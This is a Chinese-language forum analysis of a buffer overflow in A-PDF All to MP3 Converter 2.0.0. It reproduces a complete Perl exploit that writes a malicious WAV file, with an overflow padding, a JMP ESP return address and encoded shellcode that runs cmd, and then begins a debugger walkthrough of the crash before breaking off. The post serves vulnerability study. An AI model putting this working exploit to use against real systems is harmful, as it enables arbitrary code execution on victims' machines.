
# [原创]A-PDF All to MP3 Converter 2.0.0 (.wav) Buffer Overflow Exploit 分析

【原创】A-PDF All to MP3 Converter 2.0.0 (.wav) Buffer Overflow Exploit分析

作 者: kkmylove

时 间: 2011-01-19

链 接: http://bbs.pediy.com/showthread.php?t=128351

Exp来源：685K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3g2^5M7r3I4G2K9i4c8Q4x3X3c8V1j5W2)9J5k6h3y4G2L8g2)9J5c8X3g2^5M7r3I4G2K9i4c8K6i4K6u0r3x3e0j5H3x3o6W2Q4x3V1j5`.

看到exploit-db上出来这个漏洞，就分析了一下。入门阶段的文章，高手飘过。

先看下exp

```
# Exploit Title: A-PDF All to MP3 Converter v.2.0.0 stack based buffer overflow

# Software Link: 211K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3q4Q4x3X3c8H3k6r3k6Q4x3X3g2U0L8$3#2Q4x3V1k6S2L8r3I4Q4x3X3c8@1L8#2)9J5k6r3#2H3x3#2)9J5c8X3c8G2N6$3&6D9L8$3q4V1i4K6u0W2K9s2c8E0

# Version: <= 2.0.0

# Tested on: Win XP SP3 French

# Date: 17/01/2011

# Author: h1ch4m

#Email: h1ch4m@live.fr

#Home: cc1K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8V1&6W2N6q4)9J5k6p5g2X3k6X3g2U0N6s2y4Q4x3X3g2T1L8r3!0Y4M7%4m8G2N6q4)9J5k6h3y4G2L8b7`.`.

# triggering details:  Open the app, drag the wav file, booom cmd pops out



my $file= "1.wav";

my $junk = "\x41" x 4128;

my $EIP = pack('V', 0x7c86467b); # JMP ESP (ff e4)  kernel32.dll



# windows/exec - 220 bytes

# 604K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3#2W2N6r3q4K6M7r3I4G2K9i4c8Q4x3X3g2U0L8$3@1`.

# Encoder: x86/call4_dword_xor

# EXITFUNC=seh, CMD=cmd

my $shellcode = "\x29\xc9\x83\xe9\xcf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76" .

"\x0e\xd1\xd1\xc1\x66\x83\xee\xfc\xe2\xf4\x2d\x39\x48\x66" .

"\xd1\xd1\xa1\xef\x34\xe0\x13\x02\x5a\x83\xf1\xed\x83\xdd" .

"\x4a\x34\xc5\x5a\xb3\x4e\xde\x66\x8b\x40\xe0\x2e\xf0\xa6" .

"\x7d\xed\xa0\x1a\xd3\xfd\xe1\xa7\x1e\xdc\xc0\xa1\x33\x21" .

"\x93\x31\x5a\x83\xd1\xed\x93\xed\xc0\xb6\x5a\x91\xb9\xe3" .

"\x11\xa5\x8b\x67\x01\x81\x4a\x2e\xc9\x5a\x99\x46\xd0\x02" .

"\x22\x5a\x98\x5a\xf5\xed\xd0\x07\xf0\x99\xe0\x11\x6d\xa7" .

"\x1e\xdc\xc0\xa1\xe9\x31\xb4\x92\xd2\xac\x39\x5d\xac\xf5" .

"\xb4\x84\x89\x5a\x99\x42\xd0\x02\xa7\xed\xdd\x9a\x4a\x3e" .

"\xcd\xd0\x12\xed\xd5\x5a\xc0\xb6\x58\x95\xe5\x42\x8a\x8a" .

"\xa0\x3f\x8b\x80\x3e\x86\x89\x8e\x9b\xed\xc3\x3a\x47\x3b" .

"\xbb\xd0\x4c\xe3\x68\xd1\xc1\x66\x81\xb9\xf0\xed\xbe\x56" .

"\x3e\xb3\x6a\x2f\xcf\x54\x3b\xb9\x67\xf3\x6c\x4c\x3e\xb3" .

"\xed\xd7\xbd\x6c\x51\x2a\x21\x13\xd4\x6a\x86\x75\xa3\xbe" .

"\xab\x66\x82\x2e\x14\x05\xbc\xb5\xc1\x66";



open($FILE,">$file");

print $FILE $junk.$EIP.$shellcode;

close($FILE);
```

功能是打开`cmd`。先用脚本生成`1.wav`

`OD`载入程序，`F9`运行

点击`Next`->`Add`

下`ReadFile`下断点 然后载入`1.wav`

程序断了下来，看下看下`buffer`参数，在数据窗口中跟随。

然后按`ctrl+F9` 运行到函数结尾。如图一

![](https://bbs.kanxue.com/upload/attach/201101/268247_2ah1bratrmrzblo.jpg)

很清楚的看到`buffer`的四个字节的内容是`41414141`，

多按几次`F9` 发现程序不断的取得`41`，

可以猜想一下程序运行一个循环，然后不断的写数据到局部变量，由于数据长度过长导致返回地址被覆盖。呵呵

我们往上层函数继续跟，看看能不能找到这个循环。

往上跟了3层后找到一个函数
